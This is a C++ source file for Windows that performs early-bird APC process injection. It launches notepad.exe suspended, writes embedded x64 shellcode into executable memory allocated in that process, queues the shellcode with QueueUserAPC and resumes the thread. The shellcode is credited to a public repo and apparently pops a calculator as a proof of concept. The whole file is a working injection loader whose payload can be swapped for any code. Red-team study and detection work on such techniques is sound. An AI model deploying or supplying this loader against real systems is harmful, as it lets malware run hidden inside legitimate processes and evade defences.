#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <string.h>
#include <iostream>
#include <Windows.h>

constexpr auto shellcode_len = 205;

int main() {

	// https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode

	unsigned char shellcode[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
								"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
								"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
								"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
								"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
								"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
								"\x48\x83\xec\x20\x41\xff\xd6";

	unsigned int Shellcode_len = shellcode_len;

	STARTUPINFOA SI;
	ZeroMemory(&SI, sizeof(STARTUPINFOA));
	SI.cb = sizeof(STARTUPINFOA);

	PROCESS_INFORMATION PI;
	
	std::cout << "[+] Create process [Notepad]" << std::endl;

	if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI) == 0) {
		std::cerr << "[-] Err : Creation Processus : " << GetLastError() << std::endl;
		exit(GetLastError());
	}
	DWORD pid = PI.dwProcessId;

	std::cout << "[+] Allocate Memory [" << pid << "]" << std::endl;

	LPVOID VAllocEx = VirtualAllocEx(PI.hProcess, NULL, Shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (VAllocEx == NULL) {
		std::cout << "[-] Err::VAllocEx : " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}
	std::cout << "[+] Write Shellcode into memory" << std::endl;

	if (!WriteProcessMemory(PI.hProcess, VAllocEx, shellcode, Shellcode_len, NULL)) {
		std::cerr << "[-] Err::WritePMemory : " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}

	std::cout << "[+] Launch Shellcode (APC)" << std::endl;
	if (QueueUserAPC(PAPCFUNC(VAllocEx), PI.hThread, 0) == 0) {
		std::cout << "[-] Err::QUserAPC : " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}

	std::cout << "[+] Resume thread" << std::endl;
	if (ResumeThread(PI.hThread) == -1) {
		std::cerr << "[-] Err::ResumeThread : " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}

	CloseHandle(PI.hProcess);
	CloseHandle(PI.hThread);

	return 0;
}